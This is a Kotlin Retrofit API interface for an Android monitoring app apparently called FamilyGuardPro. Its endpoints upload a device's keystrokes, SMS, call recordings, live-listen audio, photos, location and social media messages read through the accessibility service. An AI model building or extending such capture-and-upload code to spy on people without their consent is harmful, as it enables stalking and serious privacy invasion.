package com.familyguardpro.network

import com.familyguardpro.models.*
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Response
import retrofit2.http.*

interface ApiService {
    
    // Auth endpoints
    @POST("api/auth/login")
    suspend fun login(@Body body: Map<String, String>): Response<AuthResponse>
    
    @POST("api/auth/register")
    suspend fun register(@Body body: Map<String, String>): Response<AuthResponse>
    
    // Pairing endpoints
    @POST("api/auth/pairing-code")
    suspend fun generatePairingCode(): Response<PairingResponse>
    
    @POST("api/auth/pair-device")
    suspend fun verifyPairingCode(@Body body: Map<String, String>): Response<DeviceResponse>
    
    // Device endpoints
    @GET("api/devices")
    suspend fun getDevices(): Response<List<Device>>
    
    @GET("api/devices/{deviceId}")
    suspend fun getDevice(@Path("deviceId") deviceId: String): Response<Device>
    
    @PUT("api/devices/{deviceId}/fcm-token")
    suspend fun updateFcmToken(
        @Path("deviceId") deviceId: String,
        @Body body: Map<String, String>
    ): Response<Unit>
    
    @DELETE("api/devices/{deviceId}")
    suspend fun deleteDevice(@Path("deviceId") deviceId: String): Response<Unit>
    
    // Sync endpoints
    @POST("api/sync")
    suspend fun syncData(@Body syncData: SyncData): Response<SyncResponse>
    
    // Notification endpoints
    @POST("api/sync/notification")
    suspend fun uploadNotification(@Body notification: NotificationData): Response<Unit>
    
    @GET("api/devices/{deviceId}/notifications")
    suspend fun getNotifications(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int,
        @Query("limit") limit: Int
    ): Response<NotificationListResponse>
    
    // Call log endpoints
    @GET("api/devices/{deviceId}/call-logs")
    suspend fun getCallLogs(@Path("deviceId") deviceId: String): Response<List<CallLogEntry>>
    
    @DELETE("api/devices/{deviceId}/call-logs")
    suspend fun deleteCallLogs(@Path("deviceId") deviceId: String): Response<Unit>
    
    // Command endpoints
    @POST("api/devices/{deviceId}/command")
    suspend fun sendCommand(
        @Path("deviceId") deviceId: String,
        @Body body: Map<String, Any>
    ): Response<CommandResponse>
    
    // File upload
    @Multipart
    @POST("api/upload/audio")
    suspend fun uploadAudio(
        @Part("deviceId") deviceId: RequestBody,
        @Part("type") type: RequestBody,
        @Part audio: MultipartBody.Part
    ): Response<Unit>
    
    // Location endpoints
    @GET("api/devices/{deviceId}/location")
    suspend fun getLocation(@Path("deviceId") deviceId: String): Response<LocationData>
    
    // Stream status
    @POST("api/stream/status")
    suspend fun notifyStreamStatus(@Body body: Map<String, String>): Response<Unit>
    
    // Gallery endpoints
    @GET("api/devices/{deviceId}/photos")
    suspend fun getGallery(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int,
        @Query("limit") limit: Int
    ): Response<GalleryResponse>
    
    // App usage endpoints
    @GET("api/devices/{deviceId}/apps")
    suspend fun getAppUsage(@Path("deviceId") deviceId: String): Response<List<AppUsageData>>
    
    // Blocked apps (included in device details under settings)
    @GET("api/devices/{deviceId}")
    suspend fun getBlockedApps(@Path("deviceId") deviceId: String): Response<Device>
    
    @PUT("api/devices/{deviceId}/settings")
    suspend fun updateBlockedApps(
        @Path("deviceId") deviceId: String,
        @Body body: Map<String, Any>
    ): Response<Unit>
    
    // Data sync for DataSyncWorker - uses path parameter (compatible with current Replit backend)
    @POST("api/sync/{deviceId}")
    suspend fun uploadData(
        @Path("deviceId") deviceId: String,
        @Body body: SyncRequestBody
    ): SyncApiResponse
    
    // Update location
    @PUT("api/devices/{deviceId}/location")
    suspend fun updateLocation(
        @Path("deviceId") deviceId: String,
        @Body body: Map<String, Any>
    ): Response<Unit>
    
    // Update permissions
    @PUT("api/devices/{deviceId}/permissions")
    suspend fun updatePermissions(
        @Path("deviceId") deviceId: String,
        @Body permissions: Map<String, Boolean>
    ): Response<Unit>
    
    // Report app change
    @POST("api/devices/{deviceId}/app-change")
    suspend fun reportAppChange(
        @Path("deviceId") deviceId: String,
        @Body data: Map<String, Any>
    ): Response<Unit>
    
    // Upload call recording
    @POST("api/recordings/call/{deviceId}")
    suspend fun uploadCallRecording(
        @Path("deviceId") deviceId: String,
        @Body callData: CallLogItem
    ): Response<Unit>
    
    // Upload audio recording (live listen)
    @POST("api/recordings/audio/{deviceId}")
    suspend fun uploadAudioRecording(
        @Path("deviceId") deviceId: String,
        @Body audioData: AudioRecordingData
    ): Response<Unit>
    
    // Keystroke monitoring endpoints
    @POST("api/sync/keystrokes")
    suspend fun uploadKeystrokes(
        @Body keystrokeBatch: KeystrokeBatchRequest
    ): Response<Unit>
    
    @GET("api/devices/{deviceId}/keystrokes")
    suspend fun getKeystrokeSessions(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 20,
        @Query("app") app: String? = null,
        @Query("riskLevel") riskLevel: String? = null
    ): Response<KeystrokeSessionsResponse>
    
    // Sync SMS messages
    @POST("api/sync/sms")
    suspend fun syncSms(@Body body: SmsRequestBody): SyncApiResponse
    
    // Get SMS messages for a device
    @GET("api/devices/{deviceId}/sms")
    suspend fun getSms(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int,
        @Query("limit") limit: Int,
        @Query("type") type: String?
    ): Response<SmsListResponse>
    
    // Social media message upload (for SENT messages captured by accessibility service)
    @POST("api/social-media/message")
    suspend fun uploadSocialMediaMessage(
        @Body messageData: Map<String, Any?>
    ): Response<Unit>
}

// Data classes for sync
data class SyncRequestBody(
    val battery: Int,
    val screenTime: Int,
    val apps: List<AppUsageItem>,
    val callLogs: List<CallLogItem>,
    val location: LocationItem?,
    val notifications: List<NotificationItem>,
    val mobileDataEnabled: Boolean? = null,
    val installedApps: List<InstalledAppItem>? = null
)

data class AppUsageItem(
    val packageName: String,
    val appName: String,
    val usageTime: Long,
    val openCount: Int
)

data class InstalledAppItem(
    val packageName: String,
    val appName: String,
    val isSystemApp: Boolean,
    val isEnabled: Boolean
)

data class CallLogItem(
    val number: String,
    val name: String?,
    val type: String,
    val duration: Long,
    val timestamp: Long
)

data class LocationItem(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float?,
    val timestamp: Long
)

data class NotificationItem(
    val packageName: String,
    val title: String?,
    val content: String?,
    val timestamp: Long
)

data class SyncApiResponse(
    val success: Boolean,
    val message: String?
)

data class AudioRecordingData(
    val duration: Long,
    val timestamp: Long,
    val data: String // Base64 encoded audio data
)

// SMS data classes
data class SmsRequestBody(
    val deviceId: String,
    val messages: List<SmsItem>
)

data class SmsItem(
    val address: String,
    val contactName: String?,
    val body: String,
    val type: String,
    val read: Boolean,
    val date: Long
)

data class SmsListResponse(
    val sms: List<SmsResponseData>,
    val total: Int,
    val page: Int,
    val pages: Int
)

data class SmsResponseData(
    val id: String,
    val address: String,
    val contactName: String?,
    val body: String,
    val type: String,
    val read: Boolean,
    val date: Long
)
